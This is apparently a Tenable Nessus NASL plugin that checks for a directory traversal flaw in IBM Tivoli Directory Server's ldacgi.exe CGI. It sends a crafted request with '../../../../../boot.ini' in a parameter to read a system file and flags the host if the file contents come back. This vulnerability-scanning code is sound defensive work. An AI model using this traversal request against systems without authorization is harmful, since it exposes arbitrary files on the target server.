#
# (C) Tenable Network Security
#

if(description)
{
 script_id(14191); 
 script_cve_id("CVE-2004-2526");
 script_bugtraq_id(10841);
 script_version ("$Revision: 1.3 $");

 name["english"] = "Tivoli LDACGI Directory Traversal";
 script_name(english:name["english"]);

 desc["english"] = "
The remote host is running IBM Tivoli's Directory Server, a lightweight LDAP
server with a web-frontend.

There is a directory traversal issue in the web frontend of this program,
more specifically in the 'ldacgi.exe' CGI. An attacker may exploit this
flaw to read arbitrary files on the remote system with the privileges of
the web server.

See also : http://www.oliverkarow.de/research/IDS_directory_traversal.txt
Solution : None at this time
Risk factor : Medium";

 script_description(english:desc["english"]);

 summary["english"] = "IBM Tivoli Directory Traversal";
 script_summary(english:summary["english"]);

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

req = http_get(item:"/ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252", port:port);
res = http_keepalive_send_recv(port:port, data:req);

if ( res == NULL ) exit(0);
   
if ("[boot loader]" >< res )
{
  security_warning(port);
  exit(0);
}
